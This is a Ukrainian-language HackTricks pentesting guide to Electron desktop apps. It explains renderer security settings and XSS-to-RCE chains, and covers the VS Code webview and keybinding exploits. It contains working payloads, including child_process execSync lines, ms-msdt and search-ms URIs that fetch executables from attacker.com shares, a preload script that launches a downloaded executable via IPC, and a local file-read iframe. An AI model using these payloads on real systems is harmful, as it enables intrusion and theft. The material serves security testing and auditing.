# Настільні застосунки Electron

{{#include ../../banners/hacktricks-training.md}}

## Вступ

Electron поєднує привілейований головний процес **Node.js** із процесами рендерингу **Chromium**. Electron — це не веббраузер: код застосунку може навмисно надавати такі можливості, як доступ до файлової системи та оболонки, тому для завантаження ненадійного вмісту потрібне суворіше проєктування меж безпеки, ніж для звичайного вебсайту.<sup>[[21]](#references)</sup>

Код застосунку Electron зазвичай пакують в архів `.asar`. Перш ніж переглядати вихідний код, розпакуйте його:

```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```

Файл `package.json` застосунку визначає його головну точку входу. Цей файл зазвичай створює вікна renderer і налаштовує їхні чутливі до безпеки параметри `webPreferences`.

```json
{
  "name": "standard-notes",
  "main": "./app/index.js",
```

Electron має два основні типи процесів:

- Main Process (має повний доступ до NodeJS)
- Renderer Process (з міркувань безпеки має мати обмежений доступ до NodeJS)

![Electron Desktop Apps - Вступ: Renderer Process (з міркувань безпеки має мати обмежений доступ до NodeJS)](<../../images/image (182).png>)

**Renderer process** — це вікно браузера, яке завантажує файл:<sup>[[3]](#references)</sup>

```javascript
const { BrowserWindow } = require("electron")
let win = new BrowserWindow()

//Open Renderer Process
win.loadURL(`file://path/to/index.html`)
```

**Основний процес** налаштовує кожен процес рендерера, зазвичай під час створення `BrowserWindow`. Безпечні параметри зменшують імовірність того, що компрометація рендерера призведе до виконання нативного коду, але самі по собі не роблять ненадійний вміст безпечним.<sup>[[21]](#references)[[22]](#references)</sup>

Перевірте принаймні такі параметри рендерера:<sup>[[22]](#references)</sup>

- **`nodeIntegration`** за замовчуванням має значення `false`. Увімкнення надає JavaScript рендерера доступ до API Node.js, а також вимикає пісочницю цього рендерера.
- **`contextIsolation`** за замовчуванням має значення `true`. Він ізолює контекст JavaScript сторінки від контексту, який використовують preload-скрипти та внутрішні компоненти Electron.
- **`preload`** за замовчуванням не має шляху. Налаштований preload-скрипт запускається перед скриптами сторінки та може надавати вузько обмежені API через `contextBridge`.
- **`sandbox`** за замовчуванням має значення `true`, починаючи з Electron 20. Він обмежує доступ рендерера до ресурсів операційної системи; встановлення `nodeIntegration: true` вимикає його.
- **`nodeIntegrationInWorker`** за замовчуванням має значення `false` і керує інтеграцією Node.js у Web Workers.
- **`nodeIntegrationInSubFrames`** за замовчуванням має значення `false`.
  - Якщо **`nodeIntegration`** **увімкнено**, це надасть змогу використовувати **API Node.js** на вебсторінках, **завантажених в iframe** у застосунку Electron.
  - Якщо **`nodeIntegration`** **вимкнено**, preload-скрипти завантажуватимуться в iframe

Приклад конфігурації:

```javascript
const mainWindowOptions = {
  title: "Discord",
  backgroundColor: getBackgroundColor(),
  width: DEFAULT_WIDTH,
  height: DEFAULT_HEIGHT,
  minWidth: MIN_WIDTH,
  minHeight: MIN_HEIGHT,
  transparent: false,
  frame: false,
  resizable: true,
  show: isVisible,
  webPreferences: {
    blinkFeatures: "EnumerateDevices,AudioOutputDevices",
    nodeIntegration: false,
    contextIsolation: false,
    sandbox: false,
    nodeIntegrationInSubFrames: false,
    preload: _path2.default.join(__dirname, "mainScreenPreload.js"),
    nativeWindowOpen: true,
    enableRemoteModule: false,
    spellcheck: true,
  },
}
```

Деякі **RCE payloads** наведено [here](https://7as.es/electron/nodeIntegration_rce.txt):<sup>[[7]](#references)</sup>

```html
Example Payloads (Windows):
<img
  src="x"
  onerror="alert(require('child_process').execSync('calc').toString());" />

Example Payloads (Linux & MacOS):
<img
  src="x"
  onerror="alert(require('child_process').execSync('gnome-calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('id').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('ls -l').toString());" />
<img
  src="x"
  onerror="alert(require('child_process').execSync('uname -a').toString());" />
```

### Перехоплення трафіку

Змініть конфігурацію start-main і додайте використання проксі, наприклад:

```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```

## Статичне трасування межі між ASAR і native-кодом за допомогою REA

**REA** може читати ASAR або витягнутий каталог застосунку, не виконуючи його JavaScript bootstrap. Граф застосунку фіксує точки входу пакетів, вбудовані модулі, налаштування `BrowserWindow` і preload, члени `contextBridge`, реєстрації IPC, запити native add-on і ідентифікатори source map. Це дає відправну точку для трасування можливості, доступної renderer, до привілейованого обробника main process.<sup>[[23]](#references)[[24]](#references)</sup>

```bash
rea analyze-javascript-application /absolute/path/to/app.asar --json > application-evidence.json
```

Для буквального рядка функції передайте повний запис Evidence як application і замініть seed на той, який спостерігали в цільовій системі:<sup>[[25]](#references)</sup>

```bash
node --input-type=module -e '
import { readFileSync, writeFileSync } from "node:fs";
const application = JSON.parse(readFileSync("application-evidence.json", "utf8"));
writeFileSync("trace-input.json", JSON.stringify({
  application, seed: { kind: "string", value: "search-result" }, direction: "both"
}));'
rea trace-application-feature ./trace-input.json --json
```

Той самий workflow `trace_application_feature` також приймає за початкові дані виявлений літеральний член API, IPC-канал або модуль. Перевірте шлях до обробника, можливі варіанти валідації та передачу керування native-коду за повернутими вихідними позиціями. Renderer-виклик `invoke` відповідає лише одному унікальному кандидату `ipcMain.handle`/`handleOnce` з тим самим точним літеральним каналом; для `send` так само потрібен один унікальний кандидат `ipcMain.on`/`once`/`addListener`. Динамічні або дубльовані обробники залишаються непідтвердженими. Запитаний член `.node` не є підтвердженим native-експортом; перш ніж робити такий висновок, переконайтеся, що відповідні дані Hopper/Ghidra мають той самий дайджест артефакту. Статична досяжність також не доводить, що цей шлях виконувався.<sup>[[24]](#references)[[25]](#references)</sup>

Про межу довіри між renderer і main та валідацію обробників див. [RCE через IPC в Electron contextIsolation](electron-contextisolation-rce-via-ipc.md).

Щодо подальшого дослідження native-коду на основі даних від провайдера див. [Інструменти реверс-інжинірингу та базові методи](../../reversing/reversing-tools-basic-methods/#evidence-backed-native-investigation-with-rea).

## Поверхня атак автоматичного оновлення Electron

Про цілісність фідів оновлень, відкат, плутанину з підписаними каналами та TOCTOU для файлів staging див. [Межі довіри автоматичного оновлення Electron](electron-auto-update-trust-boundaries.md).

## Локальна ін'єкція коду в Electron

Якщо ви маєте доступ до локального запису або інструментування встановленої програми, див. [Локальна ін'єкція коду в Electron і підміна snapshot](electron-local-code-injection-and-snapshot-tampering.md), де описано шляхи через ASAR/main process і V8 snapshot, а також посилання для конкретних ОС.

## RCE: XSS + nodeIntegration

Якщо **nodeIntegration** увімкнено (**on**), JavaScript вебсторінки може легко використовувати можливості Node.js, просто викликавши `require()`. Наприклад, у Windows програму calc можна запустити так:

```html
<script>
  require("child_process").exec("calc")
  // or
  top.require("child_process").exec("open /System/Applications/Calculator.app")
</script>
```

<figure><img src="../../images/image (1110).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

Скрипт, указаний у цьому параметрі, **завантажується перед іншими скриптами в renderer**, тому має **необмежений доступ до Node API**:

```javascript
new BrowserWindow{
  webPreferences: {
    nodeIntegration: false,
    preload: _path2.default.join(__dirname, 'perload.js'),
  }
});
```

Отже, скрипт може експортувати node-features на сторінки:

```javascript:preload.js
typeof require === "function"
window.runCalc = function () {
  require("child_process").exec("calc")
}
```

```html:index.html
<body>
  <script>
    typeof require === "undefined"
    runCalc()
  </script>
</body>
```

> [!NOTE] > **Якщо `contextIsolation` увімкнено, це не спрацює**

## RCE: XSS + contextIsolation

_**contextIsolation**_ створює **ізольовані контексти для скриптів вебсторінки та внутрішнього JavaScript-коду Electron**, щоб виконання JavaScript у кожному з них не впливало на інший. Це необхідна функція, яка усуває можливість RCE.

Якщо контексти не ізольовані, зловмисник може:

1. Виконати **довільний JavaScript у renderer** (XSS або перехід на зовнішні сайти)
2. **Перезаписати вбудований метод**, який використовується в preload або внутрішньому коді Electron, на власну функцію
3. **Запустити** використання **перезаписаної функції**
4. RCE?

Є 2 місця, де можна перезаписати вбудовані методи: у preload-коді або у внутрішньому коді Electron:


{{#ref}}
electron-contextisolation-rce-via-preload-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-electron-internal-code.md
{{#endref}}


{{#ref}}
electron-contextisolation-rce-via-ipc.md
{{#endref}}

### Обхід обробника кліку

Якщо під час натискання посилання застосовуються обмеження, можливо, їх можна обійти, **натиснувши середньою кнопкою миші** замість звичайного натискання лівою кнопкою

```javascript
window.addEventListener('click', (e) => {
```

## RCE через shell.openExternal

Щоб дізнатися більше про ці приклади, перегляньте [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) і [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)<sup>[[8]](#references)[[9]](#references)</sup>

Під час розгортання Electron desktop application важливо правильно налаштувати `nodeIntegration` і `contextIsolation`. Відомо, що за наявності цих налаштувань фактично вдається запобігти **client-side remote code execution (RCE)**, спрямованому на preload scripts або нативний код Electron з основного процесу.

Коли користувач взаємодіє з посиланнями або відкриває нові вікна, спрацьовують певні обробники подій, важливі для безпеки та функціональності застосунку:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```

Ці слухачі **перевизначаються десктопним застосунком** для реалізації власної **бізнес-логіки**. Застосунок визначає, чи слід відкривати перехід за посиланням усередині нього, чи в зовнішньому веббраузері. Зазвичай це рішення приймається за допомогою функції `openInternally`. Якщо ця функція повертає `false`, це означає, що посилання слід відкрити зовні за допомогою функції `shell.openExternal`.

**Ось спрощений псевдокод:**

![https://miro.medium.com/max/1400/1*iqX26DMEr9RF7nMC1ANMAA.png](<../../images/image (261).png>)

![https://miro.medium.com/max/1400/1*ZfgVwT3X1V_UfjcKaAccag.png](<../../images/image (963).png>)

Рекомендації з безпеки Electron JS радять не передавати ненадійний вміст у функцію `openExternal`, оскільки це може призвести до RCE через різні протоколи. Операційні системи підтримують різні протоколи, які можуть спричинити RCE. Докладні приклади та пояснення цієї проблеми наведено в [цьому матеріалі](https://positive.security/blog/url-open-rce#windows-10-19042), де є приклади протоколів Windows, здатних використати цю вразливість.<sup>[[10]](#references)</sup>

У macOS функцію `openExternal` можна використати для виконання довільних команд, наприклад `shell.openExternal('file:///System/Applications/Calculator.app')`.

**Приклади експлойтів із використанням протоколів Windows:**

```html
<script>
  window.open(
    "ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22"
  )
</script>

<script>
  window.open(
    "search-ms:query=malicious_executable.exe&crumb=location:%5C%5Cattacker.com%5Csmb_share%5Ctools&displayname=Important%20update"
  )
</script>

<script>
  window.open(
    "ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D"
  )
</script>
```

## RCE: webviewTag + вразливий preload IPC + shell.openExternal

Цю вразливість описано у **[цьому звіті](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)**.<sup>[[11]](#references)</sup>

**webviewTag** — це **застаріла функція**, яка дозволяє використовувати **NodeJS** у **renderer process**. Її слід вимкнути, оскільки вона дає змогу завантажити скрипт у контекст preload, наприклад:

```xml
<webview src="https://example.com/" preload="file://malicious.example/test.js"></webview>
```

Отже, зловмисник, якому вдасться завантажити довільну сторінку, зможе використати цей тег, щоб **завантажити довільний preload script**.

Потім цим preload script скористалися, щоб викликати **вразливий IPC service (`skype-new-window`)**, який викликав викликав **`shell.openExternal`** для отримання RCE:

```javascript
(async() => {
    const { ipcRenderer } = require("electron");
    await ipcRenderer.invoke("skype-new-window", "https://example.com/EXECUTABLE_PATH");
    setTimeout(async () => {
        const username = process.execPath.match(/C:\\Users\\([^\\]+)/);
        await ipcRenderer.invoke("skype-new-window", `file:///C:/Users/${username[1]}/Downloads/EXECUTABLE_NAME`);
    }, 5000);
})();
```

## Читання внутрішніх файлів: XSS + contextIsolation

**Вимкнення `contextIsolation` дає змогу використовувати теги `<webview>`**, подібні до `<iframe>`, для читання та ексфільтрування локальних файлів. У прикладі показано, як скористатися цією вразливістю, щоб прочитати вміст внутрішніх файлів:<sup>[[2]](#references)</sup>

![RCE: webviewTag + vulnerable preload IPC + shell.openExternal - Читання внутрішніх файлів: XSS + contextIsolation: вимкнення contextIsolation дає змогу використовувати теги , подібні до , для...](<../../images/1 u1jdRYuWAEVwJmf_F2ttJg (1).png>)

Також описано інший спосіб **читання внутрішнього файлу**, що демонструє критичну вразливість читання локальних файлів у настільному застосунку Electron. Він передбачає ін’єкцію скрипту для експлуатації застосунку та ексфільтрування даних:

```html
<br /><br /><br /><br />
<h1>
  pwn<br />
  <iframe onload="j()" src="/etc/hosts">xssxsxxsxs</iframe>
  <script type="text/javascript">
    function j() {
      alert(
        "pwned contents of /etc/hosts :\n\n " +
          frames[0].document.body.innerText
      )
    }
  </script>
</h1>
```

## **RCE: XSS + Старий Chromium**

Якщо версія **Chromium**, що входить до складу застосунку, застаріла й має відомі вразливості, її може бути можливо експлуатувати та перетворити XSS на RCE.<sup>[[20]](#references)</sup>\
Приклад наведено в цьому **writeup**: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)<sup>[[12]](#references)</sup>

## **Фішинг через XSS за допомогою обходу regex для внутрішніх URL**

Якщо ви знайшли XSS, але **не можете спричинити RCE або викрасти внутрішні файли**, можна спробувати **викрасти облікові дані за допомогою фішингу**.<sup>[[1]](#references)</sup>

Спершу перегляньте код frontend, щоб визначити, що відбувається під час відкриття нової URL-адреси:

```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```

Виклик **`openInternally`** визначає, чи відкриється посилання платформи у **вікні desktop-застосунку**, чи сторонній ресурс відкриється у системному браузері.

Якщо regex списку дозволених URL-адрес функції можна обійти — наприклад, через те, що крапки в hostname не екрановані, — зловмисник може використати XSS, щоб відкрити переконливий запит облікових даних на інфраструктурі під його контролем:

```html
<script>
  window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```

## `file://` Protocol

Як згадано в [посібнику з безпеки Electron](https://www.electronjs.org/docs/latest/tutorial/security#18-avoid-usage-of-the-file-protocol-and-prefer-usage-of-custom-protocols), сторінки, що працюють через **`file://`**, отримують широкий доступ до файлів. Отже, **XSS може дозволити завантажувати довільні файли** з комп’ютера користувача. Правильно спроєктований **custom protocol** може обмежити доступ певним набором файлів.<sup>[[21]](#references)</sup>

Окремий спосіб обійти обмеження доступу до файлів у контексті worker для попереднього перегляду в desktop assistants див. у матеріалі [Межі довіри вбудованого браузера AI assistant](../../AI/AI-Embedded-Browser-Trust-Boundaries.md#worker-context-bypass-of-a-local-previews-file-scope).

## Remote module

Модуль Electron Remote дає змогу **процесам рендерера отримувати доступ до API основного процесу**, полегшуючи взаємодію в застосунку Electron. Однак увімкнення цього модуля створює значні ризики для безпеки. Він розширює поверхню атаки застосунку, роблячи його вразливішим до таких вад, як атаки міжсайтового скриптингу (XSS).

> [!TIP]
> Хоча модуль **remote** надає процесам рендерера доступ до деяких API основного процесу, отримати RCE, просто зловживаючи цими компонентами, непросто. Водночас компоненти можуть розкривати конфіденційну інформацію.

> [!WARNING]
> Багато застосунків, які досі використовують модуль remote, роблять це так, що **у процесі рендерера потрібно ввімкнути NodeIntegration**, а це **серйозний ризик для безпеки**.

Вбудований модуль `remote` в Electron застарів, а згодом його видалили; застосунки, яким досі потрібна така модель, можуть використовувати окремий пакет `@electron/remote`. З огляду на наслідки для безпеки та продуктивності не надавайте недовіреним процесам рендерера можливості, подібні до remote.

Для використання `@electron/remote` його спершу потрібно **ініціалізувати в основному процесі**:

```javascript
const remoteMain = require('@electron/remote/main')
remoteMain.initialize()
[...]
function createMainWindow() {
  mainWindow = new BrowserWindow({
  [...]
  })
  remoteMain.enable(mainWindow.webContents)
```

Після цього процес рендерера може імпортувати об’єкти з модуля:

```javascript
import { dialog, getCurrentWindow } from '@electron/remote'
```

The **[допис у блозі](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)** описує деякі цікаві **функції**, доступні через об’єкт **`app`** із remote module:<sup>[[6]](#references)</sup>

- **`app.relaunch([options])`**  
   - **Перезапускає** застосунок, **завершуючи роботу** поточного екземпляра та **запускаючи** новий. Корисно для **оновлень застосунку** або значних **змін стану**.
- **`app.setAppLogsPath([path])`**  
   - **Визначає** або **створює** каталог для зберігання **логів застосунку**. Логи можна **отримати** або **змінити** за допомогою **`app.getPath()`** або **`app.setPath(pathName, newPath)`**.
- **`app.setAsDefaultProtocolClient(protocol[, path, args])`**  
   - **Реєструє** поточний виконуваний файл як **обробник за замовчуванням** для вказаного **протоколу**. За потреби можна вказати **власний шлях** і **аргументи**.
- **`app.setUserTasks(tasks)`**  
   - **Додає** завдання до категорії **Tasks** у **Jump List** (у Windows). Кожне завдання може керувати тим, як застосунок **запускається**, або які **аргументи** передаються.
- **`app.importCertificate(options, callback)`**  
   - **Імпортує** **сертифікат PKCS#12** до системного **сховища сертифікатів** (лише в Linux). Для обробки результату можна використати **callback**.
- **`app.moveToApplicationsFolder([options])`**  
   - **Переміщує** застосунок до папки **Applications** (у macOS). Допомагає забезпечити **стандартне встановлення** для користувачів Mac.
- **`app.setJumpList(categories)`**  
   - **Встановлює** або **видаляє** **власний Jump List** у **Windows**. Можна вказати **категорії**, щоб упорядкувати відображення завдань для користувача.
- **`app.setLoginItemSettings(settings)`**  
   - **Налаштовує**, які **виконувані файли** запускатимуться **під час входу в систему**, а також їхні **параметри** (лише в macOS і Windows).
  
Приклад:

```javascript
Native.app.relaunch({args: [], execPath: "/System/Applications/Calculator.app/Contents/MacOS/Calculator"});
Native.app.exit()
```

## Модуль systemPreferences

**Основний API** для доступу до системних налаштувань і **генерування системних подій** в Electron. Методи **subscribeNotification**, **subscribeWorkspaceNotification**, **getUserDefault** і **setUserDefault** є **частиною** цього модуля.

**Приклад використання:**

```javascript
const { systemPreferences } = require('electron');

// Subscribe to a specific notification
systemPreferences.subscribeNotification('MyCustomNotification', (event, userInfo) => {
  console.log('Received custom notification:', userInfo);
});

// Get a user default key from macOS
const recentPlaces = systemPreferences.getUserDefault('NSNavRecentPlaces', 'array');
console.log('Recent Places:', recentPlaces);
```

### **subscribeNotification / subscribeWorkspaceNotification**

* **Прослуховує** **нативні сповіщення macOS** за допомогою NSDistributedNotificationCenter.  
* До **macOS Catalina** можна було перехоплювати **всі** розподілені сповіщення, передавши **nil** у CFNotificationCenterAddObserver.  
* Після **Catalina / Big Sur** застосунки в sandbox усе ще можуть **підписуватися** на **багато подій** (наприклад, **блокування/розблокування екрана**, **монтування томів**, **мережеву активність** тощо), реєструючи сповіщення **за назвою**.

### **getUserDefault / setUserDefault**

* **Взаємодіють** із **NSUserDefaults**, де зберігаються **параметри** застосунку або **глобальні** параметри macOS.
    
* **getUserDefault** може **отримувати** конфіденційну інформацію, як-от **розташування нещодавніх файлів** або **географічне розташування користувача**.
    
* **setUserDefault** може **змінювати** ці параметри, потенційно впливаючи на **конфігурацію** застосунку.
    
* У **старіших версіях Electron** (до v8.3.0) була **доступна** лише **стандартна група** NSUserDefaults.

## Shell.showItemInFolder

Ця функція показує вказаний файл у файловому менеджері. На вразливих платформах і версіях ця взаємодія **могла автоматично запускати файл**.

Докладніше див. [https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)<sup>[[6]](#references)</sup>

## Політика безпеки вмісту

Застосунки Electron мають використовувати **Content Security Policy (CSP)**, щоб **запобігати атакам XSS**. **CSP** — це **стандарт безпеки**, який допомагає **запобігати** **виконанню** **недовіреного коду** в браузері.

Зазвичай її **налаштовують** у файлі **`main.js`** або в шаблоні **`index.html`**, додаючи CSP у **тег meta**.

Докладніше див.:


{{#ref}}
../../pentesting-web/content-security-policy-csp-bypass/README.md
{{#endref}}


## RCE: Webview CSP + довіра до postMessage + завантаження локальних файлів (VS Code 1.63)

Цей реальний ланцюжок атак зачепив Visual Studio Code 1.63 (CVE-2021-43908) і демонструє, як одну XSS, спричинену вмістом Markdown у webview, можна перетворити на повноцінний RCE, якщо CSP, postMessage і обробники схем налаштовані неправильно. Публічний PoC: https://github.com/Sudistark/vscode-rce-electrovolt<sup>[[13]](#references)</sup>

Огляд ланцюжка атак
- Перша XSS через CSP webview: згенерована CSP містила `style-src 'self' 'unsafe-inline'`, що дозволяло ін’єкції на основі inline-стилів у контексті `vscode-webview://`. Payload надсилав сигнал на `/stealID`, щоб викрасти extensionId цільового webview.
- Формування URL цільового webview: використання витеклого ID для створення `vscode-webview://<extensionId>/.../<publicUrl>`.
- Друга XSS через довіру до postMessage: зовнішній webview довіряв `window.postMessage` без суворої перевірки origin/type і завантажував HTML зловмисника з `allowScripts: true`.
- Завантаження локального файлу через переписування схеми/шляху: payload переписував `file:///...` на `vscode-file://vscode-app/...` і замінював `exploit.md` на `RCE.html`, використовуючи слабку перевірку шляху для завантаження привілейованого локального ресурсу.
- RCE у контексті з доступом до Node: завантажений HTML виконувався з доступними Node API, що давало змогу виконувати команди ОС.

Приклад примітива RCE в кінцевому контексті
```js
// RCE.html (executed in a Node-enabled webview context)
require('child_process').exec('calc.exe');            // Windows
require('child_process').exec('/System/Applications/Calculator.app'); // macOS
```

Пов’язані матеріали про проблеми довіри до postMessage:

{{#ref}}
../../pentesting-web/postmessage-vulnerabilities/README.md
{{#endref}}

## VS Code / github.dev: синтетичні комбінації клавіш webview + декларативні мости команд розширень

У червні 2026 року з’явився інший клас обходу webview у VS Code: **недовірений JavaScript усередині webview блокнота/попереднього перегляду міг синтезувати привілейовані глобальні комбінації клавіш**, оскільки preload webview пересилав дані `keydown` до host workbench, а host обробляв їх як справжнє введення користувача.<sup>[[14]](#references)</sup>

Це частина ширшої історії атак на межі довіри IDE, у яких керований проєктом вміст дістається привілейованих функцій редактора.<sup>[[19]](#references)</sup>

### Порушення межі довіри

Якщо cross-origin/sandboxed webview копіює контрольовані атакувальником поля клавіатурних подій (`key`, `code`, `keyCode`, модифікатори, `repeat`) у привілейований міст `postMessage`/message-port **без перевірки `event.isTrusted`**, JavaScript усередині webview може виконувати комбінації клавіш workbench із такими наслідками:<sup>[[14]](#references)[[15]](#references)</sup>

```javascript
window.dispatchEvent(
  new KeyboardEvent("keydown", {
    key: "a",
    code: "KeyA",
    keyCode: 65,
    ctrlKey: true,
    shiftKey: true,
  })
)
```

Це особливо корисно, коли браузер **блокує синтетичне введення**. Скриптові події клавіш зазвичай **не можуть вводити довільний текст в HTML-елементи `<input>`**, але все ще запускають комбінації клавіш, які безпосередньо обробляють `keydown`.

### Практичні способи зловживання

- **Зловживання інтерфейсом через комбінації клавіш:** націлюйтеся на глобальні прив’язки клавіш, як-от підтвердження сповіщень, навігація палітрою, активація сфокусованої кнопки або переміщення меню, замість спроб вводити команди.
- **Передбачувані привілейовані запити на основі метаданих робочої області:** контрольований репозиторієм файл `.vscode/extensions.json` може рекомендувати розширення зловмисника та створити передбачуване сповіщення про встановлення, яке можна підтвердити комбінацією клавіш, як-от `Ctrl+Shift+A`.
- **Декларативний маніфест розширення як міст для команд:** навіть якщо CSP блокує код розширення локальної робочої області у вебверсії VS Code, декларативні внески `package.json` усе ще можуть завантажуватися. Локальне розширення в `.vscode/extensions` може зареєструвати прив’язку клавіш, яка викликає `runCommands`, а потім привілейовану внутрішню команду, як-от `workbench.extensions.installExtension`.<sup>[[14]](#references)[[18]](#references)</sup>

Приклад шаблону маніфесту:

```json
{
  "contributes": {
    "keybindings": [{
      "key": "ctrl+f1",
      "command": "runCommands",
      "args": {"commands": [{
        "command": "workbench.extensions.installExtension"
      }]}
    }]
  }
}
```

- **Приховані прапорці безпеки, доступні через недовірені метадані:** якщо внутрішня команда приймає контрольовані зловмисником аргументи на кшталт `{"context":{"skipPublisherTrust":true}}`, декларативні метадані можуть приховати діалог довіри й установити розширення з Marketplace/CDN, яке зрештою виконає код зловмисника.
- **Зловживання довірою до робочого простору:** якщо до віддалених/вебробочих просторів автоматично надається довіра, розширення локального робочого простору стають цінним мостом від вмісту репозиторію до привілейованих дій редактора.
- **Розширення масштабів після компрометації:** після виконання розширення перевірте, які токени редактор надає розширенням. У `github.dev` викрадений GitHub-токен мав права, що виходили за межі відкритого репозиторію, тож запит до `https://api.github.com/user/repos` виявив інші доступні приватні репозиторії.

### Нотатки аудиту

- Розглядайте **пересилання введення з webview до host** як межу привілеїв; ніколи не передавайте повторно синтетичні події клавіш/кліків із недовірених фреймів до host.
- Перевіряйте авторизацію **всередині** чутливих команд. Не приймайте переданий викликачем контекст команди, який може встановлювати внутрішні прапорці, як-от `skipPublisherTrust`.
- Не вважайте, що блокування виконуваного локального коду розширень достатньо; також перевіряйте **декларативні внески** (`keybindings`, `menus`, `commands`, tasks) у маніфестах, контрольованих робочим простором.
- Виправлення від 3 червня 2026 року додали `isTrusted` до пересланих подій, вимкнули пересилання недовірених натискань клавіш у webview блокнотів і припинили приймати переданий викликачем контекст команди встановлення.<sup>[[16]](#references)[[17]](#references)</sup>

## **Інструменти**

Добірка **awesome-electronjs-hacking** містить додаткові дослідження, інструменти та ресурси з уразливими застосунками.<sup>[[5]](#references)</sup>

- [**Electronegativity**](https://github.com/doyensec/electronegativity) — інструмент для виявлення неправильних конфігурацій і антишаблонів безпеки в застосунках на базі Electron.
- [**Electrolint**](https://github.com/ksdmitrieva/electrolint) — плагін VS Code з відкритим кодом для застосунків Electron, що використовує Electronegativity.
- [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) перевіряє наявність уразливих сторонніх бібліотек.
- [**Electro.ng**](https://electro.ng/) — комерційний інструмент аналізу безпеки Electron.

## Лабораторні роботи

На [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s) можна знайти лабораторну роботу з експлуатації вразливих застосунків Electron.<sup>[[4]](#references)</sup>

Ці команди допоможуть вам пройти лабораторну роботу:

```bash
# Download apps from these URLs
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vulnerable to IPC-based RCE
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```

Раніше опублікована адреса для наявних закладок: [Настільні застосунки Electron](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Маршрут усієї сторінки перенаправляє сюди; історичний фрагмент не підтримується.

## References

- [1] [Фішинг і викрадення облікових даних у застосунках Electron](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
- [2] [Читання довільних файлів у настільному застосунку Facebook Messenger](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
- [3] [Electron: зловживання відсутністю ізоляції контексту - CureCon (en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
- [4] [Практикум із Hacking сучасних настільних застосунків за допомогою XSS і RCE](https://www.youtube.com/watch?v=xILfQGkLXQo&t=22s)
- [5] [awesome-electronjs-hacking - добірка ресурсів про (не)безпеку Electron.js](https://github.com/doyensec/awesome-electronjs-hacking)
- [6] [Неправильне використання API Electron: перший вибір зловмисника](https://blog.doyensec.com/2021/02/16/electron-apis-misuse.html)
- [7] [Корисні навантаження RCE для Electron nodeIntegration](https://7as.es/electron/nodeIntegration_rce.txt)
- [8] [RCE в застосунках Electron в один клік](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8)
- [9] [Небезпеки shell.openExternal() в Electron — багато шляхів до віддаленого виконання коду](https://benjamin-altpeter.de/shell-openexternal-dangers/)
- [10] [Дозволяйте довільні URL — очікуйте довільного виконання коду](https://positive.security/blog/url-open-rce#windows-10-19042)
- [11] [Як досягти RCE у відомому японському чат-застосунку за допомогою застарілої функції Electron](https://flatt.tech/research/posts/escaping-electron-isolation-with-obsolete-feature/)
- [12] [Discord Desktop - віддалене виконання коду](https://blog.electrovolt.io/posts/discord-rce/)
- [13] [Visual Studio Code - віддалене виконання коду в обмеженому режимі (CVE-2021-43908)](https://blog.electrovolt.io/posts/vscode-rce/)
- [14] [Викрадення токена GitHub в один клік через ін'єкцію подій клавіатури у VS Code Webview](https://blog.ammaraskar.com/github-token-stealing)
- [15] [Проблема VS Code #319593: Webview можуть викликати довільні комбінації клавіш в основному workbench](https://github.com/microsoft/vscode/issues/319593)
- [16] [PR VS Code #319705: підтверджувати відкриття notebook і припинити приймати контекст installExtension, наданий викликачем](https://github.com/microsoft/vscode/pull/319705)
- [17] [PR VS Code #319813: блокувати повторну програмну диспетчеризацію натискань клавіш/клацань у webview notebook](https://github.com/microsoft/vscode/pull/319813)
